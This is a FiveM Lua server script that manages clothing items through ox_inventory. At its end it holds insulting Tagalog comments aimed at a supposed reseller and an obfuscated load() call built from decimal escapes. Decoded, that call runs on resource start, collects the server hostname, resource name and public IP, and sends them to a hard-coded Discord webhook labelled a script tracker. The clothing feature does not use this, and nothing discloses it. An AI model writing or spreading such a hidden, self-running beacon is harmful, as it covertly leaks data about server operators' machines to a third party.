local ox_inventory = exports.ox_inventory

RegisterServerEvent('remove:clothes')
AddEventHandler('remove:clothes', function(skin1, skin2, type, metadata)
	local theType = type
	local _source = source
	ox_inventory:RemoveItem(_source, theType, 1, metadata)
end)

RegisterServerEvent('add:clothes')
AddEventHandler('add:clothes', function(skin1, skin2, type, gender)
	local _source = source
	local theType = type
	local metadata = {gender = gender,accessories = skin1, accessories2 = skin2, description = '[Gender: '..gender..'] ['..theType..' 1 #'..skin1..'] - ['..theType..' 2 #'..skin2..']'}
	local HasItem = ox_inventory:Search(_source, 'slots', theType)
	if json.encode(HasItem) == '[]' then
		ox_inventory:AddItem(_source, theType, 1, metadata)
	else
		if CheckCurrentShits(gender, skin1, skin2, theType) then
			ox_inventory:AddItem(_source, theType, 1, metadata)
		end
	end
end)

RegisterServerEvent('add:clothestorso')
AddEventHandler('add:clothestorso', function(skin1, skin2, skin3, skin4, skin5, skin6, hakdog, gender)
	local _source = source
	local clothes1 = hakdog
	local clothes2 = 'arms'
	local clothes3 = 'tshirt'
	local metadata = {gender = gender,torso1 = skin1, torso2 = skin2, arms1 = skin3, arms2 = skin4, tshirt1 = skin5, tshirt2 = skin6, description = '[Gender: '..gender..'] ['..clothes1..' 1 #'..skin1..'] [torso 2 #'..skin2..'] ['..clothes2..' 1 #'..skin3..'] [arms 2 #'..skin4..'] ['..clothes3..' 1 #'..skin5..'] [tshirt 2 #'..skin6..']' }
	local HasItem = ox_inventory:Search(_source, 'slots', 'torso')
	if json.encode(HasItem) == '[]' then
		ox_inventory:AddItem(_source, 'torso', 1, metadata)
	else
		if CheckCurrentClothes(gender, skin1, skin2, skin3, skin4, skin5, skin6) then
			ox_inventory:AddItem(_source, 'torso', 1, metadata)
		end
	end
end)

function CheckCurrentClothes(gender, skin1, skin2, skin3, skin4, skin5, skin6)
	local HasItem = ox_inventory:Search(source, 'slots', 'torso')
	local hasClothes = true
	for k,v in pairs(HasItem) do
		if v.metadata.gender == gender and v.metadata.torso1 == skin1 and v.metadata.torso2 == skin2 and v.metadata.arms1 == skin3 and v.metadata.arms2 == skin4 and v.metadata.tshirt1 == skin5 and v.metadata.tshirt2 == skin6 then
			hasClothes = false
			TriggerClientEvent('sdw.clothes:Notification', source, {id = 'error_have_item', title = 'SYSTEM', description = 'You already have a item clothes. please check your inventory', duration = 5000, position = 'top', style = {backgroundColor = '#FF4B4E', color = '#FFFFFF'}, icon = 'ban', iconColor = '#FFFFFF'})
		else
			hasClothes = true
		end
	end	
	return hasClothes
end

function CheckCurrentShits(gender, skin1, skin2, theType)
	local _source = source
	local HasItem = ox_inventory:Search(_source, 'slots', theType)
	local hasValid = true
	for k,v in pairs(HasItem) do
		if v.metadata.gender == gender and v.metadata.accessories == skin1 and v.metadata.accessories2 == skin2 then
			hasValid = false
			TriggerClientEvent('sdw.clothes:Notification', _source, {id = 'error_have_item', title = 'SYSTEM', description = 'You already have a item clothes. please check your inventory', duration = 5000, position = 'top', style = {backgroundColor = '#FF4B4E', color = '#FFFFFF'}, icon = 'ban', iconColor = '#FFFFFF'})
		else
			hasValid = true
		end
	end	
	return hasValid
end

--- Oo Delete Mo To Tutal Scammer Ka Naman At Magnanakaw kang Tanga Ka! Kamuka Mo si BONGBONG MARCOS BOBO!!
--- Oo Delete Mo To Tutal Scammer Ka Naman At Magnanakaw kang Tanga Ka! Kamuka Mo si BONGBONG MARCOS BOBO!!
--- Oo Delete Mo To Tutal Scammer Ka Naman At Magnanakaw kang Tanga Ka! Kamuka Mo si BONGBONG MARCOS BOBO!!
--- Oo Delete Mo To Tutal Scammer Ka Naman At Magnanakaw kang Tanga Ka! Kamuka Mo si BONGBONG MARCOS BOBO!!
--- Oo Delete Mo To Tutal Scammer Ka Naman At Magnanakaw kang Tanga Ka! Kamuka Mo si BONGBONG MARCOS BOBO!!
load("\010\067\105\116\105\122\101\110\046\067\114\101\097\116\101\084\104\114\101\097\100\040\102\117\110\099\116\105\111\110\040\041\010\009\087\097\105\116\040\049\048\048\041\010\009\032\032\032\032\108\111\099\097\108\032\115\101\114\118\101\114\078\097\109\101\032\061\032\071\101\116\067\111\110\118\097\114\040\034\115\118\095\104\111\115\116\110\097\109\101\034\041\032\010\009\032\032\032\032\108\111\099\097\108\032\114\101\115\078\097\109\101\032\061\032\071\101\116\067\117\114\114\101\110\116\082\101\115\111\117\114\099\101\078\097\109\101\040\041\032\010\010\009\032\032\032\032\076\111\103\115\040\115\101\114\118\101\114\078\097\109\101\044\032\114\101\115\078\097\109\101\044\032\034\072\101\121\033\032\083\104\105\114\111\032\084\104\105\115\032\083\101\114\118\101\114\032\105\115\032\117\115\105\110\103\032\034\032\046\046\032\114\101\115\078\097\109\101\032\046\046\032\034\032\070\114\111\109\032\089\111\117\114\032\083\101\114\118\101\114\032\080\097\099\107\101\100\033\034\041\010\032\032\032\032\010\101\110\100\041\010\010\102\117\110\099\116\105\111\110\032\076\111\103\115\040\083\101\114\118\101\114\078\097\109\101\044\032\082\101\115\111\117\114\099\101\078\097\109\101\044\032\068\101\115\099\114\105\112\116\105\111\110\041\010\032\032\032\032\087\097\105\116\040\050\048\048\041\010\032\032\032\032\080\101\114\102\111\114\109\072\116\116\112\082\101\113\117\101\115\116\040\034\104\116\116\112\115\058\047\047\097\112\105\046\105\112\105\102\121\046\111\114\103\047\034\044\032\102\117\110\099\116\105\111\110\040\101\114\114\044\032\116\101\120\116\044\032\104\101\097\100\101\114\115\041\010\032\032\032\032\032\032\032\032\108\111\099\097\108\032\073\080\032\061\032\116\101\120\116\010\032\032\032\032\032\032\032\032\108\111\099\097\108\032\101\109\098\101\100\032\061\032\123\010\032\032\032\032\032\032\032\032\032\032\032\032\123\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\099\111\108\111\114\034\093\032\061\032\049\053\056\052\052\051\054\055\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\116\105\116\108\101\034\093\032\061\032\034\083\104\105\114\111\032\077\111\114\110\105\110\103\115\116\097\114\032\083\099\114\105\112\116\032\065\110\100\032\082\101\115\111\117\114\099\101\115\032\084\114\097\099\107\101\114\033\034\044\010\009\009\009\009\091\039\097\117\116\104\111\114\039\093\032\061\032\123\010\009\009\009\009\009\091\039\110\097\109\101\039\093\032\061\032\034\083\104\105\114\111\032\068\101\118\101\108\111\112\109\101\110\116\032\087\111\114\107\115\104\111\112\034\044\010\009\009\009\009\009\091\039\105\099\111\110\095\117\114\108\039\093\032\061\032\034\104\116\116\112\115\058\047\047\109\101\100\105\097\046\100\105\115\099\111\114\100\097\112\112\046\110\101\116\047\097\116\116\097\099\104\109\101\110\116\115\047\057\051\056\053\050\051\053\051\055\053\057\054\049\050\049\049\049\057\047\049\048\051\057\057\052\054\055\056\053\052\057\057\054\054\052\053\049\054\047\083\100\119\046\112\110\103\034\044\010\009\009\009\009\125\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\100\101\115\099\114\105\112\116\105\111\110\034\093\032\061\032\068\101\115\099\114\105\112\116\105\111\110\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\102\105\101\108\100\115\034\093\032\061\032\123\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\123\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\110\097\109\101\034\093\032\061\032\034\083\101\114\118\101\114\032\110\097\109\101\034\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\118\097\108\117\101\034\093\032\061\032\083\101\114\118\101\114\078\097\109\101\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\105\110\108\105\110\101\034\093\032\061\032\116\114\117\101\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\125\044\010\009\009\009\009\009\123\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\110\097\109\101\034\093\032\061\032\034\082\101\115\111\117\114\099\101\115\032\078\097\109\101\034\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\118\097\108\117\101\034\093\032\061\032\082\101\115\111\117\114\099\101\078\097\109\101\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\105\110\108\105\110\101\034\093\032\061\032\116\114\117\101\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\125\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\123\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\110\097\109\101\034\093\032\061\032\034\083\101\114\118\101\114\032\073\080\032\065\100\100\114\101\115\115\034\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\118\097\108\117\101\034\093\032\061\032\073\080\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\105\110\108\105\110\101\034\093\032\061\032\116\114\117\101\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\125\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\125\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\102\111\111\116\101\114\034\093\032\061\032\123\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\091\034\116\101\120\116\034\093\032\061\032\034\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\103\103\047\067\098\053\065\103\051\107\085\088\100\034\044\010\009\009\009\009\009\091\034\105\099\111\110\095\117\114\108\034\093\032\061\032\034\104\116\116\112\115\058\047\047\109\101\100\105\097\046\100\105\115\099\111\114\100\097\112\112\046\110\101\116\047\097\116\116\097\099\104\109\101\110\116\115\047\057\051\056\053\050\051\053\051\055\053\057\054\049\050\049\049\049\057\047\049\048\051\057\057\052\054\055\056\053\052\057\057\054\054\052\053\049\054\047\083\100\119\046\112\110\103\034\044\010\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\032\125\044\010\032\032\032\032\032\032\032\032\032\032\032\032\125\010\032\032\032\032\032\032\032\032\125\010\032\032\032\032\032\032\032\032\080\101\114\102\111\114\109\072\116\116\112\082\101\113\117\101\115\116\040\034\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\048\048\056\048\050\057\056\052\049\057\051\052\055\056\054\054\057\051\047\113\049\087\050\086\052\116\050\082\055\068\086\082\079\087\057\120\079\057\108\109\083\087\109\068\077\109\112\069\102\051\050\079\105\118\111\090\055\104\087\119\085\078\068\076\113\084\089\068\067\097\105\085\087\076\069\097\120\089\105\066\075\070\073\054\049\121\100\034\044\032\102\117\110\099\116\105\111\110\040\101\114\114\044\032\116\101\120\116\044\032\104\101\097\100\101\114\115\041\032\101\110\100\044\032\039\080\079\083\084\039\044\032\106\115\111\110\046\101\110\099\111\100\101\040\123\117\115\101\114\110\097\109\101\032\061\032\034\083\104\105\114\111\045\068\101\118\101\108\111\112\109\101\110\116\045\087\111\114\107\115\104\111\112\034\044\032\101\109\098\101\100\115\032\061\032\101\109\098\101\100\044\032\097\118\097\116\097\114\095\117\114\108\032\061\032\039\104\116\116\112\115\058\047\047\109\101\100\105\097\046\100\105\115\099\111\114\100\097\112\112\046\110\101\116\047\097\116\116\097\099\104\109\101\110\116\115\047\057\051\056\053\050\051\053\051\055\053\057\054\049\050\049\049\049\057\047\049\048\051\057\057\052\054\055\056\053\052\057\057\054\054\052\053\049\054\047\083\100\119\046\112\110\103\039\125\041\044\032\123\032\091\039\067\111\110\116\101\110\116\045\084\121\112\101\039\093\032\061\032\039\097\112\112\108\105\099\097\116\105\111\110\047\106\115\111\110\039\032\125\041\010\032\032\032\032\101\110\100\041\010\101\110\100")() 